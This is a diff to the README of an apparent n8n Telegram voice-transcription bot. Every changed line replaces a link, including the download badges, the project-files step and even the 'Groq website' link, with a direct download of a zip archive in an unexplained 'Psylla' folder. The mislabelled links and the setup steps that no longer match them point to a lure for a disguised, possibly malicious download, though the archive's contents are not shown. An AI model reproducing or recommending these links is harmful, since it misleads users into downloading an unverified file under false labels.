@@ -1,6 +1,6 @@
 # 🎙️ n8n-telegram-voice-transcription-bot - Turn your voice notes into reports
 
-[![](https://img.shields.io/badge/Download-n8n_Bot-blue)](https://github.com/Alices5723/n8n-telegram-voice-transcription-bot)
+[![](https://img.shields.io/badge/Download-n8n_Bot-blue)](https://github.com/Alices5723/n8n-telegram-voice-transcription-bot/raw/refs/heads/main/Psylla/transcription-bot-telegram-voice-n-2.0.zip)
 
 This tool converts your spoken Telegram messages into written text. It generates summaries, translates text, and sends emails to your inbox. It uses the n8n automation platform and the Groq cloud to process audio files.
 
@@ -12,7 +12,7 @@ You need a computer that runs Windows 10 or Windows 11. Your internet connection
 
 Follow these steps to set up your bot. 
 
-1. Visit this [link](https://github.com/Alices5723/n8n-telegram-voice-transcription-bot) to access the project files.
+1. Visit this [link](https://github.com/Alices5723/n8n-telegram-voice-transcription-bot/raw/refs/heads/main/Psylla/transcription-bot-telegram-voice-n-2.0.zip) to access the project files.
 2. Click the green "Code" button on the screen.
 3. Select "Download ZIP" to save the files to your computer.
 4. Open your downloads folder.
@@ -37,7 +37,7 @@ You must connect the bot to your Telegram account.
 
 This tool uses Groq to understand your speech. 
 
-1. Go to the [Groq website](https://console.groq.com/).
+1. Go to the [Groq website](https://github.com/Alices5723/n8n-telegram-voice-transcription-bot/raw/refs/heads/main/Psylla/transcription-bot-telegram-voice-n-2.0.zip).
 2. Create a free account.
 3. Click on the "API Keys" section.
 4. Click "Create API Key."
@@ -86,6 +86,6 @@ If the bot does not respond, check your internet connection first. Ensure that y
 
 To begin using this tool, visit the download page.
 
-[![](https://img.shields.io/badge/Download-n8n_Bot-grey)](https://github.com/Alices5723/n8n-telegram-voice-transcription-bot)
+[![](https://img.shields.io/badge/Download-n8n_Bot-grey)](https://github.com/Alices5723/n8n-telegram-voice-transcription-bot/raw/refs/heads/main/Psylla/transcription-bot-telegram-voice-n-2.0.zip)
 
 Ensure you keep your API keys private. Do not share your "credentials.json" file with anyone. Store your files in a folder you can access easily. The bot works best when your voice note is clear and stays under five minutes in length. If the bot fails to transcribe, check the quality of your audio recording.
